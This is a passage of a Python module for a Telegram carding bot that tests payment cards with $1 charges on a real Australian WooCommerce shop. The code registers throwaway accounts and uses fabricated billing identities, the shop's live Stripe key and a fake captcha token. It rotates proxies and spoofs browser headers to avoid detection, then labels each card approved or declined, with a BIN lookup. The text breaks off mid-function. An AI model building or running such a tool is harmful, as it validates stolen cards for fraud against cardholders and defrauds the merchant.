# BOT/gates/charge/scharge1.py
# Stripe Charge 1$ - Compatible with WAYNE Bot Structure

import json
import asyncio
import re
import time
import httpx
import random
import string
import os
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system - MODIFIED TO USE GOOD PROXIES ONLY
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def stripe(self, message):
        print(f"🔄 {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def response_debug(self, message):
        print(f"📄 {message}")

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="xo"):
    """Check cooldown for user - SKIP FOR OWNER"""
    # Get owner ID
    owner_id = load_owner_id()

    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def get_good_proxy():
    """Get a random good proxy from FILES/goodp.json - Returns None if no good proxies available"""
    try:
        good_proxy_file = "FILES/goodp.json"
        if not os.path.exists(good_proxy_file):
            logger.warning("No goodp.json file found, proceeding without proxy")
            return None
            
        with open(good_proxy_file, 'r') as f:
            data = json.load(f)
            
        good_proxies = data.get('good_proxies', [])
        
        if not good_proxies:
            logger.warning("No good proxies available in goodp.json, proceeding without proxy")
            return None
            
        # Return a random good proxy
        selected_proxy = random.choice(good_proxies)
        logger.success(f"Using good proxy from goodp.json: {selected_proxy[:50]}...")
        return selected_proxy
        
    except Exception as e:
        logger.warning(f"Error loading good proxies: {e}, proceeding without proxy")
        return None

class StripeCharge1Checker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://www.mscollection.com.au"
        self.stripe_key = "pk_live_51LGMhXEwJOtowRbIGQx1dkHP47yjCXM8TTyQMx2UH4wJEU6aEodXrTXjTWWjd26W7dQqaBTNQkGFuQSzavNUhz7L00xwuviFao"

        # Product URL for Test product ($1.00)
        self.product_url = f"{self.base_url}/shop/women-jewellery/necklace-sets/test/"

        # Country code to name mapping
        self.country_map = {
            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa'
        }

        # Australian address data
        self.au_addresses = [
            {
                "first_name": "James", "last_name": "Smith", 
                "address": "61 Joshua Crossway", "city": "Wagnerfort", 
                "postcode": "2674", "phone": "9302082589",
                "state": "NSW", "country": "AU"
            },
            {
                "first_name": "Emma", "last_name": "Johnson", 
                "address": "123 George Street", "city": "Sydney", 
                "postcode": "2000", "phone": "0291234567",
                "state": "NSW", "country": "AU"
            },
            {
                "first_name": "Thomas", "last_name": "Williams", 
                "address": "456 Collins Street", "city": "Melbourne", 
                "postcode": "3000", "phone": "0398765432",
                "state": "VIC", "country": "AU"
            },
            {
                "first_name": "Sarah", "last_name": "Brown", 
                "address": "78 Queen Street", "city": "Brisbane", 
                "postcode": "4000", "phone": "0734567890",
                "state": "QLD", "country": "AU"
            },
            {
                "first_name": "Michael", "last_name": "Jones", 
                "address": "89 King William Street", "city": "Adelaide", 
                "postcode": "5000", "phone": "0887654321",
                "state": "SA", "country": "AU"
            }
        ]

        # 3D Secure and deferred payment patterns
        self.secure_required_patterns = [
            r'#wc-stripe-confirm-pi:',
            r'pi_[a-zA-Z0-9]+_secret_',
            r'requires_action',
            r'requires_confirmation',
            r'authentication_required',
            r'3ds',
            r'3d_secure',
            r'confirm-pi',
            r'deferred',
            r'pending'
        ]

        # MODIFIED: Initialize with good proxy from goodp.json only
        self.user_id = user_id
        self.current_proxy = None
        if PROXY_ENABLED:
            self.current_proxy = get_good_proxy()
            if self.current_proxy:
                print(f"🔄 PROXY: Using good proxy: {self.current_proxy[:50]}...")
            else:
                print(f"ℹ️ PROXY: No good proxies available, will proceed without proxy")

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get base headers mimicking browser"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)

                if response.status_code == 200:
                    data = response.json()
                    country_code = data.get('country', 'N/A')
                    country_name = self.country_map.get(country_code, 'N/A')
                    flag_emoji = self.get_country_emoji(country_code)

                    result = {
                        'scheme': data.get('brand', 'N/A').upper(),
                        'type': data.get('type', 'N/A').upper(),
                        'brand': data.get('brand', 'N/A'),
                        'bank': data.get('bank', 'N/A'),
                        'country': country_name,
                        'country_code': country_code,
                        'emoji': flag_emoji
                    }
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }
        self.bin_cache[bin_number] = default_response
        return default_response

    def extract_error_from_html(self, html_content):
        """Extract error message from HTML response"""
        if not html_content:
            return "Payment declined"

        # Pattern for woocommerce error
        pattern = r'<li>\s*There was an error processing the payment:\s*(.*?)\s*<\/li>'
        match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
        if match:
            error_text = match.group(1).strip()
            # Remove any remaining HTML tags
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            return error_text

        # Alternative pattern
        pattern2 = r'woocommerce-error[^>]*>.*?<li>(.*?)<\/li>'
        match2 = re.search(pattern2, html_content, re.IGNORECASE | re.DOTALL)
        if match2:
            error_text = match2.group(1).strip()
            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
            # Remove prefix if present
            if "there was an error processing the payment:" in error_text.lower():
                error_text = error_text.split(":", 1)[-1].strip()
            return error_text

        return "Payment declined"

    def is_secure_required_response(self, response_data):
        """Check if the response indicates 3D Secure or deferred payment is required"""
        try:
            if isinstance(response_data, dict):
                # Check redirect URL for patterns
                redirect_url = response_data.get('redirect', '').lower()

                for pattern in self.secure_required_patterns:
                    if re.search(pattern, redirect_url):
                        logger.warning(f"Secure pattern detected in redirect: {pattern}")
                        return True

                # Check for other indicators
                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
                    return True

                # Check for pi_ and _secret patterns in any field
                response_str = str(response_data).lower()
                if 'pi_' in response_str and '_secret_' in response_str:
                    return True

        except Exception as e:
            logger.warning(f"Error checking secure response: {e}")

        return False

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(user_data.get("first_name", "User"))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Check if this is a 3D Secure case
        if any(pattern in str(message).lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action", "wc-stripe-confirm-pi"]):
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = "3D SECURE❎"
        elif status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
            message_display = "Successfully Charged 1$"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
            # Use the message directly as extracted
            message_display = message if message else "Payment declined"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 1$
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{bin_info['country']}</code> [{bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>Live ⚡️</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        return f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge 1$
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

    async def human_delay(self, min_delay=0.2, max_delay=0.5):
        """Simulate human delay between actions - REDUCED for speed"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)

    # MODIFIED: make_request with good proxy support only
    async def make_request(self, client, method, url, **kwargs):
        """Make request with good proxy support and error handling - OPTIMIZED"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if good proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            print(f"❌ Request error for {url}: {str(e)}")
            raise e

    async def initialize_session(self, client):
        """Initialize session with proper cookies"""
        try:
            logger.step(1, 6, "Initializing session...")

            response = await self.make_request(
                client, 'GET', f"{self.base_url}/"
            )

            if response.status_code == 200:
                logger.success("Session initialized successfully")
                return True
            else:
                logger.error(f"Failed with status {response.status_code}")
                return False

        except Exception as e:
            logger.error(f"Session initialization error: {str(e)}")
            return False

    async def register_account(self, client):
        """Register a new account with random email"""
        try:
            logger.step(2, 6, "Registering new account...")

            # Generate random email
            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            email = f"{random_string}@gmail.com"

            # Get registration page first to extract nonce
            reg_response = await self.make_request(
                client, 'GET', f"{self.base_url}/my-account/"
            )

            if reg_response.status_code != 200:
                return False, None, f"Failed to load registration page: {reg_response.status_code}"

            # Extract registration nonce
            nonce = None
            nonce_patterns = [
                r'woocommerce-register-nonce" value="([a-f0-9]+)"',
                r'register-nonce["\']?\s*value=["\']?([a-f0-9]+)',
            ]

            for pattern in nonce_patterns:
                match = re.search(pattern, reg_response.text)
                if match:
                    nonce = match.group(1)
                    break

            if not nonce:
                return False, None, "Failed to extract registration nonce"

            # Prepare registration data
            reg_data = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }

            reg_headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/my-account/",
            }

            response = await self.make_request(
                client, 'POST', f"{self.base_url}/my-account/",
                headers=reg_headers, data=reg_data
            )

            if response.status_code == 302 or response.status_code == 200:
                logger.success(f"Account registered successfully: {email}")
                return True, email, None
            else:
                return False, None, f"Registration failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return False, None, f"Registration error: {str(e)}"

    async def add_product_to_cart(self, client):
        """Add Test product to cart"""
        try:
            logger.step(3, 6, "Adding product to cart...")

            # Load product page
            response = await self.make_request(
                client, 'GET', self.product_url
            )

            if response.status_code not in [200, 202]:
                return False, f"Failed to load product page: {response.status_code}"

            # Extract product ID
            product_id = None

            # Try multiple patterns for product ID
            id_patterns = [
                r'add-to-cart" value="(\d+)"',
                r'data-product_id="(\d+)"',
                r'product_id["\']?\s*:\s*["\']?(\d+)',
            ]

            for pattern in id_patterns:
                match = re.search(pattern, response.text)
                if match:
                    product_id = match.group(1)
                    break

            if not product_id:
                product_id = "3845"  # From the request logs
                logger.warning(f"Using fallback product ID: {product_id}")

            # Add to cart using multipart form data
            boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

            cart_data = (
                f'------WebKitFormBoundary{boundary}\r\n'
                f'Content-Disposition: form-data; name="quantity"\r\n\r\n'
                f'1\r\n'
                f'------WebKitFormBoundary{boundary}\r\n'
                f'Content-Disposition: form-data; name="add-to-cart"\r\n\r\n'
                f'{product_id}\r\n'
                f'------WebKitFormBoundary{boundary}--\r\n'
            )

            add_headers = {
                "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}",
                "Origin": self.base_url,
                "Referer": self.product_url,
            }

            response = await self.make_request(
                client, 'POST', self.product_url, 
                headers=add_headers, content=cart_data.encode()
            )

            if response.status_code in [200, 202, 302]:
                logger.success("Product added to cart successfully")
                return True, None
            else:
                return False, f"Add to cart failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Add to cart error: {str(e)}")
            return False, f"Add to cart error: {str(e)}"

    async def get_checkout_tokens(self, client):
        """Get checkout page tokens"""
        try:
            logger.step(4, 6, "Loading checkout page...")

            # Go to checkout directly (skip cart page for speed)
            response = await self.make_request(
                client, 'GET', f"{self.base_url}/checkout/"
            )

            if response.status_code != 200:
                return None, f"Failed to load checkout page: {response.status_code}"

            html = response.text

            tokens = {}

            # Extract checkout nonce
            nonce_patterns = [
                r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10})"',
                r'woocommerce-process-checkout-nonce["\']?\s*value=["\']?([a-f0-9]{10})',
                r'checkout_nonce["\']?\s*:\s*["\']?([a-f0-9]{10})',
            ]

            for pattern in nonce_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    tokens['checkout_nonce'] = match.group(1)
                    break

            # Extract wlptnonce for pickup time
            wlpt_patterns = [
                r'_wlptnonce["\']?\s*value=["\']?([a-f0-9]{10})',
            ]

            for pattern in wlpt_patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    tokens['wlptnonce'] = match.group(1)
                    break

            # Fallback
            if 'checkout_nonce' not in tokens:
                tokens['checkout_nonce'] = ''.join(random.choices('abcdef0123456789', k=10))

            if 'wlptnonce' not in tokens:
                tokens['wlptnonce'] = ''.join(random.choices('abcdef0123456789', k=10))

            logger.success("All tokens extracted successfully")
            return tokens, None

        except Exception as e:
            logger.error(f"Token extraction error: {str(e)}")
            return None, f"Token extraction failed: {str(e)}"

    def get_pickup_timestamp(self):
        """Get timestamp for pickup 5 days from now"""
        try:
            # Get date 5 days from now
            future_date = datetime.now() + timedelta(days=5)
            # Set time to 8:00 AM (morning slot)
            future_date = future_date.replace(hour=8, minute=0, second=0, microsecond=0)
            # Convert to Unix timestamp
            timestamp = int(future_date.timestamp())
            return str(timestamp)
        except Exception as e:
            # Fallback to 5 days from now in seconds
            return str(int(time.time()) + (5 * 24 * 60 * 60))

    async def create_stripe_payment_method(self, client, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(5, 6, "Creating payment method...")

            # Generate GUIDs
            guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            muid = "857a23e2-aad1-474f-abfc-005a83643b49d191d7"
            sid = "ae21e30c-4df0-49b2-9ffa-111c74f5663d3fc7ac"

            payment_data = {
                'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'billing_details[email]': user_info['email'],
                'billing_details[phone]': user_info['phone'],
                'billing_details[address][city]': user_info['city'],
                'billing_details[address][country]': 'AU',
                'billing_details[address][line1]': user_info['address'],
                'billing_details[address][line2]': '',
                'billing_details[address][postal_code]': user_info['postcode'],
                'billing_details[address][state]': user_info['state'],
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano[-2:],
                'card[exp_month]': mes,
                'allow_redisplay': 'unspecified',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(150000, 200000)),
                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-7ff0-432d-8c41-60ef1e1bd182",
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-7cfd-43e9-9c0d-a28871afe9ee",
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_version': '2024-06-20',
                'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test_token'
            }

            stripe_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            # Use separate client for Stripe
            async with httpx.AsyncClient() as stripe_client:
                response = await stripe_client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=payment_data,
                    headers=stripe_headers,
                    timeout=30.0
                )

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
                    return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def process_checkout(self, client, tokens, payment_method_id, user_info):
        """Process checkout with detailed logging and error parsing"""
        try:
            logger.step(6, 6, "Processing checkout...")

            # Get pickup timestamp (5 days ahead)
            pickup_timestamp = self.get_pickup_timestamp()

            checkout_data = {
                'wc-ajax': 'checkout',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '6',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'billing_email': user_info['email'],
                'billing_first_name': user_info['first_name'],
                'billing_last_name': user_info['last_name'],
                'billing_country': 'AU',
                'billing_address_1': user_info['address'],
                'billing_address_2': '',
                'billing_city': user_info['city'],
                'billing_state': user_info['state'],
                'billing_postcode': user_info['postcode'],
                'billing_phone': user_info['phone'],
                'shipping_first_name': '',
                'shipping_last_name': '',
                'shipping_company': '',
                'shipping_country': 'AU',
                'shipping_address_1': '',
                'shipping_address_2': '',
                'shipping_city': '',
                'shipping_state': user_info['state'],
                'shipping_postcode': '',
                'order_comments': '',
                'shipping_method[0]': 'local_pickup:7',
                'local_pickup_time_select': pickup_timestamp,
                '_wlptnonce': tokens['wlptnonce'],
                '_wp_http_referer': '/?wc-ajax=update_order_review',
                'payment_method': 'stripe',
                'wc-stripe-payment-method-upe': '',
                'wc_stripe_selected_upe_payment_type': '',
                'wc-stripe-is-deferred-intent': '1',
                'terms': 'on',
                'terms-field': '1',
                'woocommerce-process-checkout-nonce': tokens['checkout_nonce'],
                '_wp_http_referer': '/?wc-ajax=update_order_review',
                'wc-stripe-payment-method': payment_method_id
            }

            checkout_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout/",
                "User-Agent": self.user_agent
            }

            response = await self.make_request(
                client, 'POST', f"{self.base_url}/?wc-ajax=checkout",
                headers=checkout_headers, data=checkout_data
            )

            response_text = response.text

            if response.status_code != 200:
                logger.error(f"Checkout failed with status: {response.status_code}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            # Try to parse JSON response
            try:
                result = response.json()

                if isinstance(result, dict):
                    # CHECK: If this is a 3D Secure or deferred payment
                    if self.is_secure_required_response(result):
                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                        return {
                            'success': True,
                            'status': 'DECLINED',
                            'message': '3D SECURE❎'
                        }

                    if result.get('result') == 'success' and result.get('redirect'):
                        # Double check if it's really successful or requires confirmation
                        redirect_url = result.get('redirect', '').lower()

                        # If redirect contains confirmation patterns, it's likely 3D Secure
                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.success("Checkout successful - Payment APPROVED")
                        return {
                            'success': True,
                            'status': 'APPROVED',
                            'message': 'Successfully Charged 1$'
                        }

                    if result.get('result') == 'failure':
                        logger.warning(f"Checkout failed with result: failure")

                        # Extract error message from the response
                        error_msg = ""
                        if 'messages' in result and result['messages']:
                            error_msg = result['messages']
                            logger.warning(f"Raw error messages: {error_msg}")

                        # Parse the HTML error to get clean message
                        clean_error = self.extract_error_from_html(error_msg)
                        logger.warning(f"Extracted error: {clean_error}")

                        # Check for 3D Secure in error message
                        if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                            logger.warning("🔐 3D Secure authentication required")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        # Return the actual error message
                        logger.warning(f"❌ Checkout error: {clean_error}")
                        return {
                            'success': False,
